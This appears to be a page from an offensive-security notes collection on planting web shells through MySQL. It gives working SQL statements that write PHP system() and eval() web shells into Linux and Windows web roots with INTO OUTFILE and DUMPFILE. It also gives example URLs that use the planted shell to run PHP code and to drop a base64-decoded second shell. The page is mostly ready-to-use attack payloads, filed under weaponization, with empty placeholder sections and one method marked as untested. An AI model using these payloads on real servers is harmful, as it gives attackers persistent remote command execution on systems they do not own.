# MySQL

## Create User

### Manual

```

```

### Metasploit

```

```

## 02 - Webshell

### 2.1 - Command Execution

```sql
SELECT '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/shell.php';

SELECT '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE 'C:\\inetpub\\wwwroot\\phpmyadmin\\config\\shell.php';

SELECT '<HTML><BODY><FORM METHOD="GET" NAME="myform" ACTION=""><INPUT TYPE="text" NAME="cmd"><INPUT TYPE="submit" VALUE="Send"></FORM><pre><?php if($_GET["cmd"]) {​​system($_GET["cmd"]);}​​ ?> </pre></BODY></HTML>' INTO OUTFILE '/var/www/html/shell.php'
```

TODO: Test this method.

```sql
CREATE TABLE `<database_name>`.`user_input`(
`<column_name>` VARCHAR(1000) NOT NULL
) ENGINE = MYISAM;

INSERT INTO user_input values('<?php $cmd=$_GET["cmd"];system($cmd);?>')

SELECT * INTO DUMPFILE '/var/www/html/shell.php' FROM user_input;
```

### 2.2 - Evaluate PHP Code

```sql
SELECT '<?php eval($_GET[evaluate]); ?>' INTO OUTFILE '/var/www/html/eval_php.php'
```

Gather PHP Version

```
http[s]://<URL>//eval_php.php?evaluate=phpinfo();
```

Base64 encoded

```
http[s]://<URL>//eval_php.php?evaluate=if(file_put_contents('webshell.php', base64_decode(<base64_encoded>))){ echo 1;} else {echo 2;}
```

---
## References

### Backlinks

- [[07 - Tactics & Techniques & Procedures Phases/C - Initial Access/0x01 - Weaponization/Malware Development/Payload Execution/Webshell/PHP]]

### Macedonian Security Crew

- [Macedonian Security Crew: Uploading Shell via SQLmap into Database](https://www.youtube.com/watch?v=FjgKtBAiLKQ)